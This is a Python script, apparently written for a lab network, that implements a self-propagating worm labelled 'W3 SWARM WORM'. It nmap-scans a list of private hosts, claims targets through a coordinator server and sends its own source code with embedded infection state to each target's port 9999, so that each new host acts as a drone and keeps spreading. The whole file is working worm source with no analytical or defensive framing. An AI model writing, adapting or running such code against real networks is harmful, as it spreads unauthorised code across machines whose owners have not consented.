import socket
import nmap
import json
import os
import time
from datetime import datetime

COLLECTOR_IP = "192.168.210.10"
COLLECTOR_PORT = 8888
COORDINATOR_PORT = 7777
WORM_PORT = 9999
ALL_IPS = [f"192.168.100.{i}" for i in range(11, 16)]

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.210.10", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def check_and_claim(ip):
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((COLLECTOR_IP, COORDINATOR_PORT))
        s.sendall(json.dumps({"ip": ip}).encode())
        s.shutdown(socket.SHUT_WR)
        data = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            data += chunk
        s.close()
        return data.decode().strip() == "clean"
    except Exception as e:
        print(f"[-] Coordinator error: {e}")
        return False

def scan_ports(host):
    print(f"[*] Scanning ports on {host}...")
    nm = nmap.PortScanner()
    nm.scan(hosts=host, arguments='-T4 -p 21,22,80,443,3306,8080')
    open_ports = []
    if host in nm.all_hosts():
        for port in [21, 22, 80, 443, 3306, 8080]:
            try:
                if nm[host]['tcp'][port]['state'] == 'open':
                    open_ports.append(port)
            except:
                pass
    print(f"[+] {host} open ports: {open_ports if open_ports else 'none'}")
    return open_ports

def spread(target_ip, my_ip, hop_count, infected):
    print(f"[!] Spreading: {my_ip} → {target_ip}")
    try:
        with open(__file__, "r") as f:
            lines = f.readlines()
        if lines[0].startswith("# STATE:"):
            lines = lines[1:]
        worm_code = "".join(lines)
        state = json.dumps({
            "source_ip": my_ip,
            "hop_count": hop_count,
            "infected": infected,
            "is_drone": True
        })
        final_code = f"# STATE:{state}\n" + worm_code
        s = socket.socket()
        s.settimeout(5)
        s.connect((target_ip, WORM_PORT))
        s.sendall(final_code.encode())
        s.close()
        print(f"[+] Payload sent to {target_ip}")
        return True
    except Exception as e:
        print(f"[-] Spread failed: {target_ip} — {e}")
        return False

def launch_first_two(my_ip):
    print("[*] Kali launching first 2 drones simultaneously...")
    with open(__file__, "r") as f:
        lines = f.readlines()
    if lines[0].startswith("# STATE:"):
        lines = lines[1:]
    worm_code = "".join(lines)

    for ip in ALL_IPS[:2]:
        try:
            if not check_and_claim(ip):
                print(f"[-] Could not claim {ip}")
                continue

            state = json.dumps({
                "source_ip": my_ip,
                "hop_count": 0,
                "infected": [my_ip],
                "is_drone": True
            })
            final_code = f"# STATE:{state}\n" + worm_code

            s = socket.socket()
            s.settimeout(5)
            s.connect((ip, WORM_PORT))
            s.sendall(final_code.encode())
            s.close()
            print(f"[+] Drone launched on {ip}")

        except Exception as e:
            print(f"[-] Failed to launch on {ip} — {e}")

def drone_run(my_ip, source_ip, hop_count, infected):
    print(f"[*] Drone active on {my_ip}")
    while True:
        target = None
        for ip in ALL_IPS:
            if ip in infected or ip == my_ip:
                continue
            print(f"[*] Checking {ip} with coordinator...")
            if check_and_claim(ip):
                target = ip
                print(f"[+] Claimed {ip} — attacking")
                break
            else:
                print(f"[~] {ip} already claimed — skipping")
            time.sleep(1)

        if not target:
            print("[!] No targets left — drone done")
            break

        scan_ports(target)
        success = spread(target, my_ip, hop_count, infected)

        if success:
            infected.append(target)
            print(f"[+] Infection chain: {infected}")

def main():
    if os.path.exists("/tmp/w3_lock"):
        os.remove("/tmp/w3_lock")
    open("/tmp/w3_lock", "w").close()

    print("================================")
    print("      W3 SWARM WORM START       ")
    print("================================")

    my_ip = get_my_ip()

    try:
        with open(__file__, "r") as f:
            first_line = f.readline()
        if first_line.startswith("# STATE:"):
            state = json.loads(first_line[8:])
            source_ip = state["source_ip"]
            hop_count = state["hop_count"]
            infected = state["infected"]
            is_drone = state.get("is_drone", False)
            print(f"[+] State loaded — source: {source_ip}, hop: {hop_count}")
        else:
            raise ValueError("no state")
    except:
        source_ip = my_ip
        hop_count = 0
        infected = [my_ip]
        is_drone = False
        print("[+] Fresh start on Kali")

    if is_drone:
        drone_run(my_ip, source_ip, hop_count, infected)
    else:
        launch_first_two(my_ip)

    os.remove("/tmp/w3_lock")

main()
